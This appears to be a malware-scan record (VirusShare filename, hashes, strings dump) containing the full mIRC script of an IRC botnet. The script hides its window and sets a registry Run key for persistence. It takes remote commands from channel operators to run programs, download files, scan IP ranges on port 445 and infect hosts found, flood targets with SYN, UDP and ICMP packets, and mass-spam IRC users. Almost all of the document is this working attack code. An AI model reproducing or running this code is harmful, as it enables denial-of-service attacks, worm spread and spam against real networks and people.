$3- | sockwrite -nt Clone* privmsg $2 : $3- }\n  if ($1 = chat.flood) { sockwrite -nt Clone* privmsg $2 :\u0001DCC CHAT $2 1058633484 3481\u0001  }\n  if ($1 = Quit) { Sockwrite -nt Clone* Quit : $+ $2- }\n  if ($1 = massquit) { SockWrite -nt Clone* Join $2 | Sockwrite -nt Clone* Quit : $+ $3- }\n  if ($1 = fnick) { sockwrite -nt Clone* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }\n  if ($1 = Die) { timeropensock* off | sockclose Clone* }\n}\nalias opensock { sockopen Clone $+ $fnick %cserver %cport }\nalias Stay {\n  if (PING = $1) { sockwrite -nt * $1- }\n}\non *:Sockopen:Clone*:{\n  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)\n  .sockwrite -nt $sockname USER %user %user %user : $+ %user\n  .sockwrite -nt $sockname NICK $fnick\n}\nraw 433:*:{\n nick [ $+ $os $+ - $+ $r(1000,9999) $+ ]] \n}\nalias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }\nalias apagestop { timerapage* off | sockclose apages* }\non *:sockopen:apages*:{\n  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite\n}\non *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }\non *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }\nalias startscan {\n  inc %totalscaning\n  if %totalscaning == %total finished\n  set %ip1 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 1\n  set %ip2 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 2\n  set %ip3 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 3\n  set %ip4 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 4\n  set %ip5 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 5\n  set %ip6 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 6\n  set %ip7 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 7\n  set %ip8 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 8\n  set %ip9 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 9\n  set %ip10 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 10\n  set %ip11 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 11\n  set %ip12 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 12\n  set %ip13 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 13\n  set %ip14 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 14\n  set %ip15 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 15\n  set %ip16 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 16\n  set %ip17 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 17\n  set %ip18 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 18\n  set %ip19 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 19\n  set %ip20 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 20\n  set %ip21 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 21\n  set %ip22 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 22\n  set %ip23 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 23\n  set %ip24 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 24\n  set %ip25 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  opensocks\n}\nalias opensocks {\n  sockopen ip1 %ip1 445\n  if $1 == 1 finished\n  sockopen ip2 %ip2 445\n  if $1 == 2 finished\n  sockopen ip3 %ip3 445\n  if $1 == 3 finished\n  sockopen ip4 %ip4 445\n  if $1 == 4 finished\n  sockopen ip5 %ip5 445\n  if $1 == 5 finished\n  sockopen ip6 %ip6 445\n  if $1 == 6 finished\n  sockopen ip7 %ip7 445\n  if $1 == 7 finished\n  sockopen ip8 %ip8 445\n  if $1 == 8 finished\n  sockopen ip9 %ip9 445\n  if $1 == 9 finished\n  sockopen ip10 %ip10 445\n  if $1 == 10 finished\n  sockopen ip11 %ip11 445\n  if $1 == 11 finished\n  sockopen ip12 %ip12 445\n  if $1 == 12 finished\n  sockopen ip13 %ip13 445\n  if $1 == 13 finished\n  sockopen ip14 %ip14 445\n  if $1 == 14 finished\n  sockopen ip15 %ip15 445\n  if $1 == 15 finished\n  sockopen ip16 %ip16 445\n  if $1 == 16 finished\n  sockopen ip17 %ip17 445\n  if $1 == 17 finished\n  sockopen ip18 %ip18 445\n  if $1 == 18 finished\n  sockopen ip19 %ip19 445\n  if $1 == 19 finished\n  sockopen ip20 %ip20 445\n  if $1 == 20 finished\n  sockopen ip21 %ip21 445\n  if $1 == 21 finished\n  sockopen ip22 %ip22 445\n  if $1 == 22 finished\n  sockopen ip23 %ip23 445\n  if $1 == 23 finished\n  sockopen ip24 %ip24 445\n  if $1 == 24 finished\n  sockopen ip25 %ip25 445\n  timerscannerTE 1 12 sockclose ip*\n  timerscannerSA 1 15 startscan\n}\nalias randip {\n  unset %1p1 %1p2\n  set %1p1 $1-\n  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))\n  return %1p2\n}\non 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %445 % [ $+ [ $sockname ] ] | run pnp11.exe /n /fh /r \"vlxd.bat   %445 $+ \" | msg %cc \u0002[\u0002scanner\u0002]\u0002 Found: %445 $+ , attempting to infect.. | sockclose $sockname | unset %445 | halt }\nalias download {\n  var %socket $+(dl,$chr(46),$nopath($2))\n  if (!$sock(%socket)) {\n    sockopen %socket $1 80\n    sockmark %socket HEAD $1 $2\n  }\n  else { echo $color(info) -s * Socket already in use. }\n}\nalias downd {\n  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {\n    var %socket $+(dl,$chr(46),$nopath($2))\n    if (!$sock(%socket)) {\n      sockopen %socket $1 80\n      sockmark %socket HEAD $1 $2\n    }\n    else { echo $color(info) -s * Socket already in use. }\n  }\n}\nalias percent return $+($round($calc((100 / $2) * $1),2),%)\n\non *:SOCKOPEN:dl.*:{\n  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }\n  hadd -m ticks $sockname $ticks\n  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(\",$mircdir,%file,\"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)\n  write -c %fullfile\n  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0\n  %sckr HOST: $gettok($sock($sockname).mark,2,32)\n  %sckr ACCEPT: *.*\n  %sckr $crlf\n}\n\non *:SOCKREAD:dl.*:{\n  if ($sockerr) {\n    echo $color(info) -s * Error: $sock($sockname).wsmsg\n    return\n  }\n  var %a\n  :begin\n  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }\n  else { sockread &b }\n  if ($sockbr) {\n    tokenize 32 $sock($sockname).mark\n    if ($1 == HEAD) {\n      if (%a) {\n        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }\n      }\n      else {\n        sockmark $sockname GET $2- %totsize\n      }\n    }\n    elseif ($1 == GET) {\n      var %file = $+(\",$mircdir,$nopath($3),\"), %cursize = $file(%file).size\n      var %totsize = $gettok($sock($sockname).mark,4,32)\n      bwrite %file -1 &b\n    }\n    goto begin\n  }\n}\n\non *:SOCKCLOSE:dl.*:{\n  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)\n  /msg %cc * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.\n}\nalias H1dd3 { if ($appstate != hidden) { /exit } }\nalias s33 { if ($appactive = $true) { /exit } }\non *:connect:{ .ial on | .timerjc 0 $rand(5,10) /jc |   .timercheck off | .pdcc on | .fsend on | clearall }\nalias vlxd32 { %x = $+($r(a,z),$r(1,99),.reg) | write %x REGEDIT4 | write %x [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] | write %x $+(\"Win,$os,Service\"=\",$replace($mircdir,\\,\\\\),$nopath(Tskdbg.exe),\") | .run -n regedit /s %x } }"
    },
    "filename": "VirusShare_0e83686f08744afc735863d3177bf692",
    "filesize": 32075,
    "filetype": "data",
    "hashes": {
        "md5": "0e83686f08744afc735863d3177bf692",
        "sha1": "2e838414d287a49edf673cdce7dac30cae1b4a9a",
        "sha256": "fd919269e7cec2d59154245391880cee936ac05553821dbf464dcb1527d41bff"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on *:START:{",
            "  .ddeserver on",
            "  run $mircdir $+ pnp11.exe /n /fh UPDATE",
            "  .nick [ $+ $os $+ - $+ $r(1,9999) $+ ]]",
            "  .n0clone",
            "  .Cona",
            "  .timercheck 0 10 Cona",
            "  .timerh1dd3 0 1 H1dd3",
            "  .timers33 0 1 s33",
            "  .vlxd32",
            "alias n0clone { if ($portfree(8857) == $false) { exit } | socklisten noclone 8857 }",
            "on 800:TEXT:*:*: {",
            "  if ($nick isop %cc) {",
            "    if ($1 = !ntimer) { if ($2 = Sock) { set %ntnick $3 | set %ntserver $4 | set %ntport $5 | sockopen NTimer $+ $r(1,1000) $+ $fnick %ntserver %ntport }  }",
            "    if ($1 = !ntreg) { reg $2- }",
            "    if ($1 = !ntstop) { ntstop }",
            "    if ($1 = !dde) { /dde $2 command \"\" / $+ $3- }",
            "    if ($1 = !ind) { .identd on $2- }",
            "    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }",
            "    if ($1 = !pfast) { if ($4 == random) { //Tw1stStart $2 $3 $r(1,64000) | halt } | //Tw1stStart $2 $3 $4 }",
            "    if ($1 = !fserv) { /msg %cc [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }",
            "    if ($1 = !packet) && ($3 != $null) { run pnp11.exe /n /fh /r \"ping.exe $2 -n $3 -l 65500\" | msg %cc ",
            "14DDoS",
            "14 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }",
            "    if ($1 = !packet.stop) { run pnp11.exe /n /fh /r \" $+ $mircdirlibparse.exe -kf ping.exe\" | msg %cc ",
            "14DDoS",
            "14 packeting halted! }",
            "    if ($1 = !run) && ($2 != $null) { /run $2- }",
            "    if ($1 = !icmp) { if ($2 == $null) { /msg %cc ",
            "rror",
            "yntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run pnp11.exe /n /r \"ping -n $4 -l $3 -w 0 $2 \" }",
            "    if ($1 = !Clone) { /clone $2- }",
            "    if ($1 = !syn) { if ($2 !== $null) { msg %cc ",
            "ynPacket",
            "ttacking",
            "12 $+ $2 $+ ",
            "12 on ",
            "12 $+ $3 $+ ",
            "ith ",
            "12 $+ $4 $+ ",
            "ackets  | synp start $4 $2 $3 } }",
            "    if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }",
            "    if ($1 = !download) { /download $2- | msg %cc [Downloading..] $nopath($3-) }",
            "    if ($1 = !downd) { /downd $2- | msg %cc [Downloading..] $nopath($3-) }",
            "    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %cc ",
            "8ERROR",
            "14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %cc ",
            "14bnc",
            "14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }",
            "    if ($1 = !bnc.stats) && ($sock(Bnc)) { msg %cc ",
            "14bnc",
            "14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }",
            "    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %cc ",
            "14bnc",
            "14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }",
            "    if ($1 = !startscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { msg %cc ",
            "14scanner",
            "14 starting scan from: $2 to $3 | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }",
            "    if ($1 = !randscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { set %begit $randip($2) | msg %cc ",
            "14scanner",
            "14 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }",
            "    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %cc ",
            "14scanner",
            "14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }",
            "    if ($1 = !var) { msg %cc Variable equals to: [ [ $$2- ] ] }",
            "    if ($1 = !inviter) { %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { Sockclose inviterM | Sockclose inviterN | remove ichan.txt | /set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg %cc ",
            "inviter",
            "1 Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg %cc ",
            "inviter",
            "1 Status",
            "1 Not Connected! | halt }  ",
            "      if ($sock(inviter*,0) > 0) { msg %cc ",
            "inviter",
            "1 Status",
            "1 Connected ",
            " $+ $sock(inviter*,0) $+ ",
            "1] } } |   if ($2 == stats) { msg %cc ",
            "inviter",
            "1 Stats Total Invited:",
            " $calc( %i.t.j  +  %i.t.p ) $+ ",
            "1Delay:",
            " %i.ondelay } |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3- $+ * }  |  if ($2 == msg) { set %imsg $3- | msg %cc ",
            "inviter",
            "1 Invite Message set to (",
            "14 $+ $3- $+ ",
            "      if ($2 == ctotal) { msg %cc ",
            "inviter",
            "1 Random Channels Total",
            " $+ $lines(ichan.txt) $+ ",
            " }  |  if ($2 == reset) { msg %cc ",
            "inviter",
            "1 All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  ",
            "      if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg %cc ",
            "inviter",
            "14: ",
            "1Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i 1  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } ",
            "    if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $fnick | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msg %cc ",
            "inviter",
            "1 Delay set to: (",
            "14 $+ $3 $+ ",
            "1). } }",
            "    if ($1 = !inviteto) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { msg %cc My Bot is Already ON!. }",
            "      .if ($2 == off) { .msg %cc Mass SPaMMer Sets OFF. | sockclose did* | timerinv* off }  ",
            "      .if ($2 == status) && ($sock(did*,0) != 0) { .msg %cc Im ",
            "14Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: (",
            " $+ %SPMchannel $+ ",
            ") with About;- (",
            " $+ %Total.users $+ ",
            ") Users Gonna be Affected this msg with no (@/+) one. }",
            "      .if ($2 == status) && ($sock(did*,0) = 0) { .msg %cc Im ",
            "4NOT",
            " Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: (",
            " $+ %SPMchannel $+ ",
            ") with About;- (",
            " $+ %Total.users $+ ",
            ") Users Gonna be Affected this msg with no (@/+) one. }",
            "      .if ($2 == GO) && ($sock(did*,0) != 0)  { msg %cc Iam Already GONE!. }",
            "      .if ($2 == GO) && ($sock(did*,0) = 0)  { msg %cc Iam Going ;). | /ruwinviter }",
            "      if ($sock(did*,0) = 0) {",
            "        set %total.users 0",
            "        .if ($3 = rand) { set %SPMChannel $read(ichan.txt)  }",
            "        .if ($5 = rand) { set %SPMChannel $read(ichan.txt)  }",
            "        .if ($2- == $null) { .msg %cc Are U FooL Use !inviteto  ",
            "NetWork/server",
            " (Channel/rand) (Invite MSG) ",
            "        .if ($2 == arabchat) { .set %thisnick $nick | .set %network $gettok(KSA@Gulf@Qatar@Doha@Bahrain@irc@, $+ $rand(1,7) $+ ,64) $+ .arabchat.org | .set %SPMchannel $3 | set %SPAM $4-  | /ruwinviter }  ",
            "        .if ($2 == DALNet) { .set %thisnick $nick | .set %network $gettok(jade@liberty@jade@dragon@nexgo@sniper@irc@twisted@, $+ $rand(1,8) $+ ,64) $+ .dal.net | .set %SPMchannel $3 | set %SPAM $4- | /ruwinviter  }",
            "        .if ($2 == EFnet) { .set %thisnick $nick | .set %network $gettok(irc.homelien.no@irc.Qeast.net@irc.flamed.net@irc.inet.tele.dk@irc.webgiro.se@efnet.demon.co.uk, $+ $r(1,6) $+ ,64) | .set %SPMchannel $3  | set %SPAM $4- | /ruwinviter }",
            "        .if ($2 == server) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }",
            "      }",
            "    }",
            "alias ruwinviter { sockopen did $+ $ticks $+ $r(1,999) %network }",
            "alias finished { msg %cc ",
            "14scanner",
            "14 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }",
            "on 1:SOCKOPEN:did*:{ if ($sockerr) { return } ",
            "  .sockwrite -nt $sockname PONG $ctime",
            "  .sockwrite -tn $sockname USER $fnick $+ $r(a,z) $+ $r(1,60) a a : $fnick $fnick ",
            "  .sockwrite -tn $sockname NICK $fnick $+ $chr($r(65,125)) $+ $chr($r(65,125)) ",
            "  .sockwrite -nt $sockname join %SPMChaNNeL",
            "  .sockwrite -nt $sockname list >100",
            "  timerpart 1 $r(5,30) /sockwrite -nt $sockname PART %SPMCHaNNeL ",
            "on 1:SOCKREAD:did*:{ sockread -f %t.v | if ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { write ichan.txt $gettok(%t.v,4,32) } | /saving $sockname %t.v } ",
            "alias saving {",
            "  if ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names : $+ %SPAM }",
            "  if ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names2 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names3 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names4 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names5 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names6 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names7 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names8 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names9 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names10 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names11 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names12 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names13 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names14 :  $+ %SPAM }",
            "  if ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names15 :  $+ %SPAM }",
            "  if ($3 = 366) { timerinv $+ $r(1,999) 1 1001 /finisheds $1 }",
            "  if (47 = $left($3,2)) { /finished2 $1 }",
            "  if (PING = $1) { sockwrite -nt PONG $1- }",
            "on *:disconnect:{   timercheck -o 0 15 Cona  }",
            "alias ntstop { timernick off | sockclose NTimer* }",
            "alias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }",
            "alias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | msg %cc ",
            "Packeting",
            " Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { msg %cc ",
            "ERROR!",
            "urrently ",
            "ttacking:",
            " $gettok($timer(gcoolt).com,3,32) ",
            " | return } |  msg %cc sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }",
            "alias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 ",
            "  sockudp Tw1st $2 $3 $str(_6\u0735KTE_},60)",
            "  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)",
            "  sockudp Tw3st $2 $3 $str(@,920)",
            "  sockudp Tw4st $2 $3 $str(0010110,130) ",
            "  sockudp Tw5st $2 $3 $str(Pong,200)",
            "  sockudp Tw6st $2 $3 $str(Tw1st,180)",
            "  sockudp Tw7st $2 $3 $str(*,350)",
            "  sockudp Tw8st $2 $3 $str(link,200)",
            "  sockudp Tw9st $2 $3 $str(Tw1st,180)",
            "  return |  :done | //msg %cc ",
            "Packeting",
            " finished | .timerTw1st off | unset %gnum ",
            "alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | msg %cc ",
            "ttack ",
            "one! }",
            "alias syn {",
            "  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }",
            "  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }",
            "alias goinvite { sockwrite -nt $1 JOIN %SPMChaNNeL |   timerpart 1 $r(5,60) /sockwrite -nt $1 PART %SPMCHaNNeL  }",
            "alias finisheds { .msg %cc I've Spammed on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: (",
            " $+ %SPMchannel $+ ",
            ") with About;- (",
            " $+ %Total.users $+ ",
            ") Users Has been Affected this msg with no (@/+) one. Message sets: ( $+ %SPAM $+ ",
            ")..... | if ($exists(ichan.txt) == $true) { set %SPMChannel $read ichan.txt } | if ($exists(ichan.txt) == $false) { set %SPMChannel $read inv.txt } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }",
            "alias finished2 { .msg %cc There Was a Problem on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: (",
            " $+ %SPMchannel $+ ",
            ") NO Users Has been Messaged... AutoChanging Channel.. | if ($exists(ichan.txt) == $true) { set %SPMChannel $read ichan.txt } | if ($exists(ichan.txt) == $false) { set %SPMChannel $read inv.txt } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }",
            "on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }",
            "on *:sockread:BncClient*:{",
            "  sockread %BncClient",
            "  if ($gettok(%BncClient,1,32) == NICK) {",
            "    set %Bnc.nick $gettok(%BncClient,2,32)",
            "  if ($gettok(%BncClient,1,32) == USER) {",
            "    set %Bnc.user $gettok(%BncClient,2-,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>",
            "  if ($gettok(%BncClient,1,32) == PASS) { ",
            "    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now",
            "      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect",
            "      %Bnc.legit = yes",
            "    } ",
            "    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { ",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!",
            "    }",
            "  if ($gettok(%BncClient,1,32) == CONN) {",
            "    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname",
            "    }",
            "    if (BncServer $+ $remove($sockname,BncClient) != $null) {",
            "      sockclose BncServer $+ $remove($sockname,BncClient)",
            "    }",
            "    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)",
            "    set %Bnc.server.passwd $gettok(%BncClient,4,32)",
            "  else {",
            "    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {",
            "      halt",
            "    }",
            "    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient",
            "alias jc { /join %cc Sh4d0w }",
            "on *:sockopen:BncServer*:{",
            "  if ($sockerr) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose $sockname",
            "    halt",
            "  if ($sock($sockname).status != active) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection",
            "    sockclose BncServer $+ $remove($socknme, BncServer)",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection",
            "  sockwrite -n $sockname NICK %Bnc.nick",
            "  sockwrite -n $sockname USER %Bnc.user",
